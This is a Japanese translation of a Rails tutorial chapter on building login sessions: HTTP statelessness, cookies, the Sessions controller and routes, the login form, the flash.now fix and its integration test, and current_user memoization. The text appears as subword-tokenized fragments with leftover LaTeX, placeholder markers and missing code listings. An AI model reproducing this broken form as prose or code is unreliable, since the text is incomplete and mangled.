▁\ href { http :// en . w ikipedia . org / wiki / H y per text _ Transfer _ Pro to c ol } { HTTP } は \ href { https :// en . w ikipedia . org / wiki / S t at e less _ proto c ol }{\ emph { ス テ ート レ ス な プロトコル } } です 。 文字 通 り 「 ス テ ート ▁( state )」 が 「 ない ▁( less )」 ので 、 HTTP の リクエスト ひとつ ひとつ は 、 それ より 前 の リクエスト の 情報を まったく 利用 できない 、 独 立 した ト ラ ン ザ ク ション として 扱 わ れ ます 。 HTTP は 言 って み れば 、 リクエスト が 終 わ ると 何も か も 忘れ て 次 回 最 初 から や り 直 す 健 忘 症 的な プロトコル であり 、 過 去 を 捨 て た 旅 から 旅 の 流れ 者 的な プロトコル です ▁( しかし 、 だ から こ そこ の プロトコル は 非常に 頑 丈 な のです )。
▁この 本 質 的な 特 性 の ため 、 ブラウザ のある ページ から 別の ページに 移動 したときに 、 ユーザーの ID を保持し ておく 手 段 が \ href { http :// en . w ikipedia . org / wiki / H y per text _ Transfer _ Pro to c ol # HTTP _ session _ state } { HTTP プロトコル 内 「 には 」 } まったく ありません 。 ユーザー ログイン の 必要な Web アプリケーション では 、\ href { http :// en . w ikipedia . org / wiki / Session _ ( com put er _ sc i en ce ) }{\ emph { セッション } } と呼ばれる 半 永続的 な 接続 を コンピュータ 間 ▁( ユーザーの パ ソ コ ン の Web ブラウザ と Rails サーバー など ) ▁ に 別 途 設定 します 。 セッション は HTTP プロトコル と 階層 が 異なる ▁( 上の 階層 にある ) ▁ ので 、 HTTP の 特 性 とは 別 に ▁( 若 干 影 響 は 受け る もの の ) ▁ 接続 を 確 保 できます 。 ( 訳 注 : ▁ 昔 は 離 れ た 相手 と 一 手 ず つ 葉 書 を やりとり して の ん び り と 将 棋 を指す 酔狂 な 人 が とき ど き い ましたが 、 将 棋 の 対 戦 を ひとつ の セッション と 考え れば 、 その 下 の 郵 便 システム は HTTP 同様 ス テ ート レ ス であり 、 対 戦 者 同士 が 盤 の 状態 を保持し ていれば 、 郵 便 システム や 郵 便 配 達 夫 が 対 戦 の 進 行 や 内容 に 一 切 か か わ ら なくても ゲ ー ム は 成 立 します )。
▁Rails で セッション を実装する 方法 として 最も 一般的な のは 、\ href { http :// en . w ikipedia . org / wiki / HTTP _ cookie }{\ emph { cookies } } を使用する 方法 です 。 cookies とは 、 ユーザーの ブラウザ に保存 される 小さな テキスト データ です 。
▁ cookies は 、 ある ページ から 別の ページ に移動し た 時に も 破 棄 され ないので 、 ここに ユーザー ID などの 情報を 保存 できます 。 アプリケーション は cookies 内の データ を使用して 、 たとえば ログイン 中 の ユーザーが 所 有 する 情報を データベースから 取り出す ことができます 。
▁ ブラウザ によって は 、「 中 断 した 時点 から 再 開 」 などの オプション 機能 で セッション を 復 旧 できる もの もあります 。 このような 動作 は ブラウザ 依 存 で 、 かつ ブラウザ 側 で しか 行 え ないので 、 Rails サーバー では こう した セッション 復 旧 機能を 実現 する ことはできません 。
▁ セッション を RESTful な リソース として モデリング できる と 、 他の RESTful リソース と 統 一 的に 理解 でき て 便利です 。 ログイン ページ では \ emph { new } で 新しい セッション を 出力 し 、 その ページ で ログイン すると \ emph { create } で セッション を 実際に 作成 して 保存 し 、 ログアウト すると \ emph { destroy } で セッション を 破 棄 する 、 といった 具 合 です 。
▁ただし Users リソース と 異なる のは 、 Users リソース では バ ッ ク エ ンド で User モデル を 介 して データベース 上の 永続的 データ にアクセス するのに 対 し 、 Session リソース では 代わりに cookies を 保存 場所 として 使用する 点 です 。 ログイン の しく み の 大 半 は 、 cookies を使用した 認 証 メ カ ニ ズ ム によって 構 築 されています 。
▁ 本 節 と 次の 節 では 、 セッション 機能 を作成する 準備 として 、 Session コントローラ 、 ログイン 用の フォーム 、 両者 に 関連する コントローラのアクション を作成します 。
▁\ ref { sec : log g ing _ in } では 、 セッション を 操作 するために 必要な コードを いくつか 追加 し 、 ユーザー ログイン を 完成 させる 予定です 。
▁ 前 章 同様に 、 トピックブランチ で 作業 して から 、 最後に 更新 を マージ します 。
▁ ログイン と ログアウト の 要素 を 、 Sessions コントローラの 特定の REST アクションに それぞれ 対応 付け る ことにします 。 ログイン の フォーム は 、 この節 で 扱 う \ ko de { new } アクション で 処理 します 。 \ ko de { create } アクションに \ text tt { POST } リクエストを 送信 すると 、 実際に ログイン します ▁(\ ref { sec : log g ing _ in })。 \ ko de { destroy } アクションに \ text tt { DELETE } リクエストを 送信 すると 、 ログアウト します ▁(\ ref { sec : log g ing _ out })
▁( 表 \ ref { table : RESTful _ users } の HTTP メソッドと REST アクション の 関連付けを 思い 出 しましょう )。
▁最初に 、 Sessions コントローラ と \ ko de { new } アクション を生成します 。
▁\ ref { sec : signup _ form } の ユーザー登録ページ のとき と同様に 、 図 \ ref { fig : login _ mockup } モックアップ を元に セッション 新 規 開 始 用の ログインフォーム を作成します 。
▁ ログインフォーム のモックアップ
▁ Users リソース のとき は 専 用の \ ko de { resources } メソッドを使用して RESTful な ルーティング を 自動的に フル セット で 利用 できるように しました ▁( リスト \ ref { code : users _ resource }) ▁ が 、 Session リソース では フル セット は い ら ないので 、「 名前付き ルーティング 」 だけ を使用します 。 この 名前付き ルーティング では 、\ text tt { GET } リクエスト や \ text tt { POST } リクエストを \ ko de { login } ルーティング で 、\ text tt { DELETE } リクエストを \ ko de { log out } ルーティング で 扱 います 。
▁この ルーティング を 反 映 した もの を リスト \ ref { code : sessions _ resource } に示します 。 なお 、\ ko de { rails ▁ generate ▁ controller } で 生成された 不要な ルート は 、 この リスト から 削除 して あります 。
▁ リソース を追加して 標準的な RESTful アクション を get できるように する
▁リスト \ ref { code : sessions _ resource } で定義した ルーティング の URL や アクション ▁( 表 \ ref { table : RESTful _ users }) ▁ は 、 ユーザー 用の URL や アクション ▁( 表 \ ref { table : RESTful _ sessions }) ▁ と だ いた い 似 ています 。
▁ 新しい セッション の ページ ▁( ログイン )
▁ 新しい セッション の作成 ▁( ログイン )
▁ / log out
▁ セッション の 削除 ▁( ログアウト )
▁{0} 表 8 . 1 {/0} ▁{1} リスト \ ref { code : sessions _ resource }{/1} の セッション ルール によって 提供され る ルーティング
▁ これまで に 名前付き ルーティング を だ い ぶ 追加 し てきた ので 、 ここで アプリケーションの 全 ルーティング を 表示 できる と 便利です 。 \ ko de { rake ▁ routes } コマンド を 実行 すれば い つ でも ルーティング の リスト を 表示 できます 。
▁$ ▁bundle ▁exec ▁rake ▁ routes < n > ▁P ref i x ▁ V erb ▁ U R I ▁P at ter n ▁ Controller # Action < n > ▁ root ▁GET ▁ / ▁ static _ pages # home < n > ▁ help ▁GET ▁ / help ( . : format ) ▁ static _ pages # help < n > ▁ about ▁GET ▁ / about ( . : format ) ▁ static _ pages # about < n > ▁ contact ▁GET ▁ / contact ( . : format ) ▁ static _ pages # contact < n > ▁ signup ▁GET ▁ / signup ( . : format ) ▁ users # new < n > ▁ login ▁GET ▁ / login ( . : format ) ▁ sessions # new < n > ▁ POST ▁ / login ( . : format ) ▁ sessions # create < n > ▁ log out ▁ DELETE ▁ / log out ( . : format ) ▁ sessions # destroy < n > ▁ users ▁GET ▁ / users ( . : format ) ▁ users # index < n > ▁ POST ▁ / users ( . : format ) ▁ users # create < n > ▁ new _ user ▁GET ▁ / users / new ( . : format ) ▁ users # new < n > edit _ user ▁GET ▁ / users / : id / edit ( . : format ) ▁ users # edit < n > ▁ user ▁GET ▁ / users / : id ( . : format ) ▁ users # show < n > ▁ PATCH ▁ / users / : id ( . : format ) ▁ users # update < n > ▁ PUT ▁ / users / : id ( . : format ) ▁ users # update < n > ▁ DELETE ▁ / users / : id ( . : format ) ▁ users # destroy
▁ 今 はこの ルーティング を 完全に 理解 できる 必要はありません 。 それ でも この リスト を 何 と なく 眺 め て み れば 、 アプリケーションで サポート されている 全 アクション が この リスト にある ことに 気 付 く と思います 。
▁ コントローラ と ルーティング を定義し たので 、 今度は 新しい セッション で使用する ビュー 、 つまり ログインフォーム を 整 え ましょう 。
▁ 図 \ ref { fig : login _ mockup } と 図 \ ref { fig : signup _ mockup } を 比 較 してみる と 、 ログインフォーム と ユーザー登録フォーム には ほとんど 違 い がない ことがわかります 。 違 い は 、 4 つ あった フィールド が ▁[ E mail ] ▁ と ▁[ P as s word ] ▁ の 2 つ に 減 っている こと だけです 。
▁ ログインフォーム で 入力 した 情報 に 誤 り が あった とき は 、 ログイン ページを もう一度 表示 して エラーメッセージ を 出力 します ▁( 図 \ ref { fig : login _ failure _ mockup })。
▁\ ref { sec : signup _ error _ messages } では 、 エラーメッセージ の 表示 に エラーメッセージ 用 パーシャル ▁( 部分 テンプレート ) ▁ を使用し ましたが 、 その エラーメッセージ は Active ▁Record によって自動的に 表示 され ていた ことを 思い 出 しましょう 。
▁ セッション は Active ▁Record オブジェクト では ないので 、 上の ように Active ▁Record が よ し な に エラーメッセージ を表示し てくれる ということ は 期 待 できません 。 そこで 、 ここでは フラッシュメッセージ で エラー を表示します 。
▁{0} 図 8 .2{/0} ▁{1} ログイン 失敗 時 のモックアップ {/1}
▁リスト \ ref { code : signup _ form } のとき は 、 以下のように ユーザー登録フォーム で \ ko de { form \_ for } ヘルパー を使用し 、 ユーザーの インスタンス変数 \ ko de {@ user } を 引数 にとって い ました 。
▁ セッション フォーム と ユーザー登録フォーム の 最大 の違い は 、 セッション には Session モデル という が なく 、 そのため \ ko de {@ user } のような インスタンス変数 に相当 する もの も ない 点 です 。
▁従って 、 新しい セッション フォーム を作成する ときに は 、\ ko de { form \_ for } ヘルパー に追加 の 情報を 独 自 に 渡 さ なければなりません 。
▁Rails では 上の ように 書く だけで 、「 フォームの \ ko de { action } は / users という URL への \ text tt { POST } である 」 と 自動的に 判 定 します が 、 セッション の場合は リソース の \ emph { 名前 } と それ に対応する URL を 具 体 的に 指定 する必要があります
▁( 注 : ▁\ ko de { form \_ for } の代わりに \ ko de { form \_ tag } を使う ことも でき 、 Rails では この 方が 慣 用 的な 方法 です 。 しかし 、 ユーザー登録フォーム では form _ for を使用する 方が 一般的 であり 、 並 列 構造 を 強 調 するために も form _ for を使用し ました 。
▁ 適切な \ ko de { form \_ for } を使用することで 、 リスト \ ref { fig : login _ mockup } の ユーザー登録フォーム を 参 考 に して 、 リスト \ ref { code : signup _ form } に示した ような モックアップ に 従 った ログインフォーム を簡単に 作成 できます ▁( 図 \ ref { code : login _ form })。
▁ ログインフォーム のコード
▁ ユーザーが すぐ クリック できるように 、 ユーザー登録ページ の リンク を追加して ある ことにご注目ください 。
▁リスト \ ref { code : login _ form } のコード を使用すると 、 図 \ ref { fig : login _ form } のように ログインフォーム が表示されます
▁( [ L o g ▁in ] ▁ リンク が まだ 効 か ないので 、 自分 で ブラウザ の アドレス バー に 「 / login 」 と URL を直接 入力 してください 。
▁ ログイン リンク は \ ref { sec : cha n g ing _ the _ layout _ links } で 動く ようにします )。
▁ ログインフォーム
▁ 生成された HTML フォーム を リスト \ ref { code : login _ form _ html } に示します 。
▁{0} リスト 8 . 3 : {/0} ▁< n >< n > {1} リスト \ ref { code : login _ form } で 生成 した ログインフォーム の HTML < n > {/1}
▁ ユーザー登録 では 最初に ユーザー を作成し ましたが 、 ログイン で セッション を作成する 場合に 最初に 行う のは 、 入力 が \ emph { 無効な } 場合 の 処理 です 。
▁最初に 、 フォーム が 送信された とき の動作 を 順 を 追 って 理解 します 。 次に 、 ログイン が 失敗した場合 に 表示される エラーメッセージ を 配置 します ▁( モックアップ を 図 \ ref { fig : login _ failure _ mockup } に示します )。
▁次に 、 ログイン に成功した場合 ▁(\ ref { sec : log g ing _ in }) ▁ に 使用する 土 台 部分 を作成します 。 ここでは 、 ログイン が 送信 される たびに 、 パスワード と メールアドレス の 組み合わせ が 有効 かどうかを 判 定 します 。
▁それでは 、 最初に 最 小 限 の \ ko de { create } アクション を Sessions コントローラ で 定義 し 、 空 の \ ko de { new } アクション と \ ko de { destroy } アクション も つ い で に 作成 しておきましょう ▁( リスト \ ref { code : initial _ create _ session })。
▁リスト { p 0} の {2} create {/2} アクション の中で は 何も 行 わ れ ません が 、 アクション を実行すると {2} new {/2} ビュー が 出力 される ので これ で 十分 です 。
▁\ href { http :// localhost :3000/ sessions / new }{/ sessions / new } フォーム を 送信 すると 図 \ ref { fig : initial _ failed _ login _ rails _ 3 } のようになります 。
▁ Sessions コントローラの \ ko de { create } アクション ▁( 暫 定 版 )
▁リスト { p 2 } の { 4 } create {/4} で 最初に 失敗した ログイン
▁ 図 \ ref { fig : initial _ failed _ login _ rails _ 3 } に 表示 されている デバッグ情報 にご注目ください 。 \ ref { sec : login _ form } の 終わり でも 簡単に 触 れ ましたが 、\ ko de { params } ハッシュ では 、 以下のように \ ko de { session } キー の下に メールアドレス と パスワード があります 。
▁ ユーザー登録 の場合 ▁( 図 \ ref { fig : signup _ failure }) ▁ と同様 、 これらの パラメータ は リスト { p 2 } に示したように {3} ネスト した ▁( 入 れ 子 になった ) ▁ {/3} ハッシュ になっ ていました 。
▁ 特に 、\ ko de { params } は 以下のような 入 れ 子 ハッシュ になっています 。 ハッシュ の中に ハッシュ がある 構造 です 。
▁ 上 も 自体 も ハッシュ であり 、 以下の 要素 を 含 んで います 。
▁その 結果 、
▁ 上 は フォーム から 送信された メールアドレス であり 、
▁ 上 は フォーム から 送信された パスワード です 。
▁ 要 する に \ ko de { create } アクション の中で は 、 ユーザーの 認 証 に 必要な あらゆる 情報を \ ko de { params } ハッシュ から 簡単に 取り 出 せる ということです 。
▁ そして 、 認 証 に 必要な すべての メソッド も ここ まで に 学 んで あります ▁( そう な るように 本書 を 書いた のです )。 ここでは 、 Active ▁Record が提供する \ ko de { User . find \_ by } メソッド ▁(\ ref { sec : find ing _ user _ objects }) ▁ と 、\ ko de { has \_ secure \_ password } が提供する \ ko de { authenticate } メソッド ▁(\ ref { sec : creat ing _ and _ a u the n tic at ing _ a _ user }) ▁ を使用します 。
▁ 認 証
▁self を省略した 結果を リスト \ ref { code : find _ authenticate _ user } に示します 。
▁ ユーザーを データベースから 見つけ て 検証 する
▁ ハ イ ラ イ ト 部分 の最初の 行 ▁( リスト \ ref { code : find _ authenticate _ user }) ▁ では 、 送信された メールアドレス を使用して 、 データベースから ユーザー を取り出し ています
▁(\ ref { sec : uniqueness _ validation } では メールアドレス をすべて 小文字 で 保存 して いた ことを 思い 出 しましょう 。 そこで ここでは \ ko de { downcase } メソッドを使用して 、 有効な メールアドレス が 入力 された ときに 確 実 に マッチする ようにしています )。
▁ 次の 行 は 少し わかり にくい かもしれませんが 、 Rails プログラミング では 定 番 の 手法 です 。
▁Ruby では \ ko de { nil } と \ ko de { false } 以外の すべての オブジェクトは 、 真 偽 値 では \ ko de { true } になる ▁(\ ref { sec : objects _ and _ message _ passing }) ▁という 性 質 を 考 慮 すると 、 & & の 前 後 の値 の 組み合わせ は 表 \ ref { table : user _ and _ and } のようになります 。
▁ 表 \ ref { table : user _ and _ and } を見ると 、 入力 された メールアドレス を持つ ユーザーが データベースに 存 在 し 、 かつ 入力 された パスワード が その ユーザーの パスワード である 場合 のみ 、\ ko de { if } 文 が \ ko de { true } になる ことがわかります 。 言 葉 で まとめ ると 「 ユーザーが データベースに あり 、 かつ 、 認 証 に成功した場合 に のみ 」 となります 。
▁ 存在しない
▁ 誤 った パスワード
▁ 正しい パスワード
▁\ ref { sec : signup _ error _ messages } では 、 ユーザー登録 の エラーメッセージ 表示 に User モデルの エラーメッセージ を うまく 利用 した ことを 思い 出 しましょう 。
▁ ユーザー登録 の場合 、 エラーメッセージ は 特定の Active ▁Record オブジェクト に 関連付け られ ていた ので その 手 が 使 え ました 。 しかし セッション では Active ▁Record の モデル を使用 していない ため 、 その 手 が 通 用 しません 。
▁ そこで 、 ログイン に 失敗した ときに は 代わりに フラッシュメッセージ を表示する ことにします 。
▁ 最初の コードをリスト \ ref { code : failed _ login _ at te m p t } に示します ▁( このコード は わ ざ と 少し 間 違 え て あります )。
▁ ログイン 失敗 時の 処理 を扱う ▁( 誤 り あり )
▁ ログイン に 失敗した とき の フラッシュメッセージ
▁ 本 文 および リスト \ ref { code : failed _ login _ at te m p t } の コメント で 述 べ た ように 、 このコード には 誤 り があります 。
▁ ページに は ち ゃ ん と エラーメッセージ が表示され ています が 、 ど こ が 問題 な の でしょう か 。
▁ 実は 上のコード の ま まで は 、\ emph { リクエスト } の フラッシュメッセージ が 一度 表示される と 消 え ずに 残 ってしまいます 。 リスト \ ref { code : signup _ flash } で リダイレクト を使用した とき とは 異 なり 、 表示 した テンプレート を \ ko de { render } メソッドで 強 制 的に 再 レンダリング しても リクエスト と 見 な され ない ため 、 リクエスト の メッセージ が 消 え ません 。
▁たとえば 、 わ ざ と 無効な 情報を 入力 して 送信 して エラーメッセージ を表示し て から 、 Home ページ をクリックして 移動 すると 、 そこで も フラッシュメッセージ が表示され た ま ま になっています ▁( 図 \ ref { fig : flash _ persisten ce })。
▁ この問題 は \ ref { sec : a _ flash _ test } で 修正 します 。
▁{0} 図 8 . 6 {/0} ▁{1} フラッシュメッセージ が 消 え ずに 残 っている 例 {/1}
▁\ label { fig : flash _ persisten ce } }< n >\ end { figure }< n >< n >< n > ▁% ▁ sub subsection ▁render ing _ with _ a _ flash _ message ▁( end )< n >< n > ▁\ subsection { フ ラ ッ シ ュ のテスト } ▁% ▁( fold )< n > ▁\ label { sec : a _ flash _ test }< n >< n >
▁ フラッシュメッセージ が 消 え ない 問題 は 、 この アプリケーションの 小さな バグ です 。
▁ さ っ そ く 、 ログインフォーム の 送信 について 簡単な 統合テスト を作成する こと から 始 め ましょう 。
▁この 統合テスト は 、 そのまま バグ の ドキュメント にも なり 、 今後 の 回 帰 バグ 発生 を 防止 する 効 能 もあります 。 さらに 、 今後 この 統合テスト を 土 台 として 、 より 本 格 的な 統合テスト を作成する ときに も 便利です 。
▁ アプリケーションの ログイン の 挙 動 をテストする ために 、 最初に 統合テスト を生成します 。
▁次に 、 図 \ ref { fig : failed _ login _ flash } と 図 \ ref { fig : flash _ persisten ce } の 手順 を テストコード で 再 現 する必要があります 。
▁ 基本的な 流れ を以下に示します 。
▁ ログイン 用の パス を開く
▁ 新しい セッション の フォーム が正しく 表示 された ことを確認する
▁ わ ざ と 無効な \ ko de { params } ハッシュ を使用して セッション 用 パス に POST する
▁ 新しい セッション の フォーム が 再度 表示 され 、 フラッシュメッセージ が追加され る ことを確認する
▁ 別の ページ ▁( Home ページ など ) ▁ に い った ん 移動 する
▁ 移動 先 の ページ で フラッシュメッセージ が 表示 \ emph { されていない } ことを確認する
▁上の テスト 手順 の実装 を リスト \ ref { code : flash _ persisten ce _ test } に示します 。
▁ フラッシュメッセージ の 残 留 を キャッチ する テスト
▁ login _ path
▁$ ▁bundle ▁exec ▁rake ▁test ▁ T E S T = test / integration / users _ login _ test . rb
▁上の ように 、 引数 で \ ko de { T E S T } に テスト ファイルの フル パス を与える と 、 その テスト ファイル だけ を 実行 できます 。
▁リスト \ ref { code : flash _ persisten ce _ test } の 失敗する テストを パス させる には 、 本 編 のコード で \ ko de { flash } を \ ko de { flash . now } に置き換え ます 。 後 者 は 、 レンダリング が 終わっ ている ページ で 特 別 に フラッシュメッセージ を表示する ことができます 。
▁\ ko de { flash } の メッセージ とは 異 なり 、\ ko de { flash . now } の メッセージ は その後 リクエスト が 発生 したときに 消 滅 します ▁( リスト \ ref { code : flash _ persisten ce _ test } では ま さ に その 手順 を 再 現 しています )。
▁ 置き換え の 終わっ た 正しい アプリケーション コードをリスト \ ref { code : correct _ login _ failure } に示します 。
▁ ログイン 失敗 時の 正しい 処理
▁続いて 、 ログイン の 統合テスト を含む 全 テストスイート を実行し てみると 、 ▁\ passing ▁ になる ことを確認 できます 。
▁$ ▁bundle ▁exec ▁rake ▁test ▁ T E S T = test / integration / users _ login _ test . rb < n > $ ▁bundle ▁exec ▁rake ▁test
▁ 無効な 値 の 送信 を ログインフォーム で 正しく 処理 できる ようになった ので 、 次 は 、 実際に ログイン 中 の 状態 で の 有効な 値 の 送信 を フォーム で 正しく 扱 え るように します 。
▁この節では 、 cookies を使用する 一時 セッション で ユーザーを ログイン できるようにします 。 この cookies は 、 ブラウザを閉じ ると 自動的に 有効 期 限 が 切 れる もの を使用します 。
▁\ ref { sec : remember _ me } では 、 ブラウザを閉じ ても 保 持 される セッション を追加します 。
▁ セッション を実装する には 、 様 々 な コントローラ や ビューで お び ただし い 数 の 関数 を定義する 必要があります 。
▁Ruby の { 0} モジュール {/0} という 機能 を使用すると 、 そう した 関数 を 一 箇所 に パ ッ ケ ー ジ 化 できる ことを { p 1 } で 学 び ました 。
▁ あり が たい ことに 、 Sessions コントローラ ▁(\ ref { sec : sessions _ controller }) ▁ を生成し た 時点 で 既に セッション 用 ヘルパー モジュール も ▁( 密 か に ) ▁ 自動生成 されています 。
▁さらに 、 Rails の セッション 用 ヘルパーは ビュー にも 自動 で インクルード されます 。 Rails の 全 コントローラの ベース クラス ▁( = Application ▁ コントローラ ) ▁ に この モジュール を インクルード すれば 、 この アプリケーションの コントローラ でも 使えるようになります ▁( リスト \ ref { code : sessions _ helper _ include })。
▁ Application コントローラに Session ヘルパー モジュール を インクルード する
▁ 設定 が完了し たら 、 いよいよ ユーザー ログイン の コードを 書き 始 め ましょう 。
▁Rails で 事 前 定義 済み の \ ko de { session } メソッドを使用して 、 単純な ログイン を 行える ようにします
▁( なお 、 これは \ ref { sec : sessions _ controller } で 生成 した Sessions コントローラ とは 無 関係 です ので ご注意ください )。
▁この \ ko de { session } メソッドは ハッシュ のように 扱 え る ので 、 以下のように 代入 します 。
▁上のコード を実行すると 、 ユーザーの ブラウザ 内の 一時 cookies に 暗号化 済み のユーザー ID が 自動 で 作成されます 。 この後 の ページ で 、\ ko de { session [: user \_ id ]} を使用して ユーザー ID を 元 通 り に 取り出す ことができます 。
▁ 一方 、\ ko de { cookies } メソッド ▁(\ ref { sec : remember _ me }) ▁ の場合は 、\ ko de { session } メソッドで 作成された 一時 cookies は 、 ブラウザを閉じ た 瞬 間 に 有効 期 限 が 終 了 します 。
▁ 同じ ログイン 手法 を 様 々 な 場所 で 使い 回 せる ように するために 、 Sessions ヘルパー に \ ko de { log \_ in } という名前の メソッド を定義する ことにします ▁( リスト \ ref { code : log _ in _ f un c tion })
▁\ ko de { log \_ in } 関数
▁\ ko de { session } メソッド で作成した 一時 cookies は自動的に 暗号化 され 、 リスト \ ref { code : log _ in _ f un c tion } のコードは 保 護 されます 。 そして ここ が 重要な のですが 、 攻撃者が たとえ この 情報を cookies から 盗 み 出 す ことができ た として も 、 それ を使って 本 物 のユーザー として ログイン すること は できない のです 。
▁ただし 今 述 べ た ことは 、\ ko de { session } メソッド で作成した 「 一時 セッション 」 に しか 該 当 しません 。 \ ko de { cookies } メソッド で作成した 「 永続的 セッション 」 では そこ まで 断 言 は \ emph { できません } 。
▁ 永続的 な cookies には 、\ emph { セッション ハイジャック } という 攻撃 を 受け る 可能性 が 常に つ き ま と います 。 ユーザーの ブラウザ 上 に保存 される 情報 については 、\ ref { sec : remember _ me } で もう少し 注意 深 く 扱 う ことにします 。
▁リスト { p 0} で {2} log _ in {/2} という ヘルパーメソッド を 定義 できた ので 、 や っ と 、 ユーザー ログイン を行って セッション の {2} create {/2} アクション を 完了 し 、 ユーザーの プロフィール ページに リダイレクト する 準備 が できました 。
▁作成した コードをリスト \ ref { code : log _ in _ success } に示します
▁リスト { p 0} で モジュール を インクルード している ので 、 Session コントローラ で {2} log _ in {/2} メソッド を使用できます 。
▁ ユーザーに ログイン する
▁以下の 簡単な リダイレクト は 、
▁\ ref { sec : the _ f in i sh ed _ signup _ form } でも 使用 しました 。
▁Rails では 、 自動的に 上のコード を 変 換 して 、 以下のような ユーザー プロフィール ページ への ルーティング します 。
▁リスト { p 0} で {2} create {/2} アクション を 定義 できた ので 、\ ref { code : login _ form } で定義した ログインフォーム も 正常に 動作する ようになった はずです 。
▁ 今 は ログイン しても 画面 表示 が 何も 変 わ ら ないので 、 ユーザーが ログイン 中 かどうか は 、 ブラウザ セッション を直接 確認 しない 限 り わかり ません 。
▁ このままでは 困 る ので 、 ログイン している ことが は っ き り わかるように します 。 そこで \ ref { sec : current _ user } では 、 セッション に含まれる ID を 利用 して 、 データベースから 現在のユーザー 名 を取り出し て 画面 で 表示する 予定です 。
▁\ ref { sec : cha n g ing _ the _ layout _ links } では 、 アプリケーションの レイアウト 上の リンク を変更する 予定です 。 この リンクをクリックすると 、 現在 ログ オン している ユーザーの プロフィール が表示されます 。
▁ユーザー ID を 一時 セッション の中に 安全 に 置 け る ようになった ので 、 今度は その ユーザー ID を 別の ページ で 取り出す ことにしましょう 。 そのため には 、\ ko de { current \_ user } メソッドを 定義 して 、 セッション ID に対応する ユーザー名 を データベースから 取り 出 せる ようにします 。
▁\ ko de { current \_ user } メソッドの 目的 は 、 以下のような コードを 書 け るように することです 。
▁ 現在のユーザー を検索する 方法 の ひとつ として 思い 付 く のは 、 ユーザー プロフィール ページ ▁( リスト { p 0} ) ▁ と同様に 、 以下の {2} find {/2} メソッド を使用すること です 。
▁しかし \ ref { sec : find ing _ user _ objects } で 既に 経験 済み の とおり 、 ユーザー ID が 存在しない 状態 で \ ko de { find } を使用すると 例外 が発生し てしまいます 。
▁ find の この 動作 は 、 ユーザー プロフィール ページ では 完全に 適 切 です 。 ID が 無効 の場合は 例外を発生 してくれ なければ 困 る からです 。 しかし 、 ユーザーが ログイン していない など 多くの 状 況 では 、\ ko de { session [: user \_ id ]} の値 は \ ko de { nil } になります 。
▁この 状態 を修正する ために 、\ ko de { create } メソッド 内で メールアドレス の 検索 に 使 った の と同じ \ ko de { find \_ by } メソッド を使う ことにします 。 ただし 今度は \ ko de { email } ではなく \ ko de { id } で 検索 します 。
▁今度は ID が 無効な 場合 ▁( = ユーザーが 存在しない 場合 ) ▁ にも メソッドは 例外を発生 せ ず 、\ ko de { nil } を返します 。
▁今度は \ ko de { current \_ user } を 以下のように 定義 し 直 します 。
▁これは 正常に動作し ます 。 しかし 少し 残 念 な のは 、\ ko de { current \_ user } が ページ 内で 複 数 使用されている と 、 同じ 回 数 だけ データベース も 呼び出され てしまう ことです 。
▁ そこで 、 Ruby の 慣習 に従って 、\ ko de { User . find \_ by } の 実行 結果を インスタンス変数 に保存 する ことにします 。 こうすることで 、 データベースの 読み出し は 最初の 一 回 だけ になり 、 以後 の 呼び出し では インスタンス変数 を返す ようになります { p 1 } 。 地 味 な よう ですが 、 Rails の 高速 化 のために 重要な テクニック です 。
▁この ように 、 メソッド 呼び出し で の 変数 代入 を 記 憶 して 次 回 以降 の 呼び出し で 使い 回 す 手法 を \ href { http :// en . w ikipedia . org / wiki / M e m o i z ation }{\ emph { メ モ 化 ▁( me m o i z ation ) } } ▁ と呼びます 。
▁ me m or i z ation の ス ペ ル ミ ス \ emph { ではなく } 、 それ を も じ った me m o i z ation ▁( r がない ) ▁という 造 語 である ことにご注意ください 。
▁\ emph { or } 演算子 「\ text tt { | | } 」( \ ref { sec : objects _ and _ message _ passing }) ▁ を使用すれば 、 上の 「 メ モ 化 」 コードを 以下のように た った 1 行 で 書 け ます 。
▁ここで 重要な のは 、 User オブジェクト そのもの の 論理値 は 常に true になる ことです 。 その おかげで 、\ ko de {@ current \_ user } に 何も 代入 されていない とき だけ \ ko de { find \_ by } 呼び出し が 実行 され 、 無 駄 な データベース 読み出し が行われ なくなります 。
▁上のコードは ひ と まず 動作します が 、 実 はまだ 「 Ruby 的に 」 正しい コード ではありません 。 \ ko de {@ current \_ user } への 代入 は 、 Ruby では 以下のような 短縮 形 で 書く の が 王 道 です 。
▁@ current _ user ▁| | = ▁User . find _ by ( id : ▁ session [: user _ id ] )
▁この 「\ text tt { | | = } 」( or ▁ equ al s ) ▁という 代入 演算子 は Ruby で 広 く 使用されている イ デ ィ オ ム であり 、 Ruby 開発者 を 志 す なら この 演算子 に 習 熟 すること が 重要です 。
▁\ emph { or ▁ equ al s } という 概念 は 一 見 神 妙 不 可 思 議 に 見え ます が 、 他の もの に な ぞ ら え て 考え れば 難 しく ありません 。
▁ 多くの コンピュータ プログラム では 、 以下のような 記 法 で 変数 の 値を 1 つ 増 や す ことができます 。
▁< n >< n >\ begin { v erb at im }< n >
▁ x ▁= ▁ x ▁+ ▁1
▁ そして 、 Ruby ▁( および C 、 C + + 、 P er l 、 P y th on 、 J a v a などの 多くの プログラミング 言語 ) ▁ では 、 上の 演 算 を 以下のような 短縮 形 で 表 記 することもできます 。
▁ x ▁+ = ▁1
▁ 他の 演算子 についても 同様 の 短縮 形 が 利用 できます 。
▁$ ▁ rails ▁console < n > ▁ >> ▁ x ▁= ▁1 < n > ▁=> ▁1 < n > ▁ >> ▁ x ▁+ = ▁1 < n > ▁=> ▁2 < n > ▁ >> ▁ x ▁* = ▁3 < n > ▁=> ▁ 6 < n > ▁ >> ▁ x ▁- = ▁ 8 < n > ▁=> ▁- 2 < n > ▁ >> ▁ x ▁ / = ▁2 < n > ▁=> ▁- 1
▁ いずれ の場合 も 、\ text tt { ● } という 演算子 がある とき の 「\ text tt { x ▁= ▁ x ▁ ● ▁ y }」 と 「\ text tt { x ▁ ● = ▁ y }」 の動作 は 同じです 。
▁Ruby では 、「 変数 の 値が \ text tt { nil } なら 変数 に 代入 する が 、 nil で なければ 代入 しない ▁( 変数 の 値を 変え ない )」 という 操作 が 非常に よく 使われ ます 。
▁ { p 0} で説明した {2} or {/2} 演算子 {3} | | {/3} を使用すれば 、 以下のように 書く ことができます 。
▁ >> ▁@ foo < n > ▁=> ▁nil < n > ▁ >> ▁@ foo ▁= ▁@ foo ▁| | ▁" bar " < n > ▁=> ▁" bar " < n > ▁ >> ▁@ foo ▁= ▁@ foo ▁| | ▁" baz " < n > ▁=> ▁" bar "
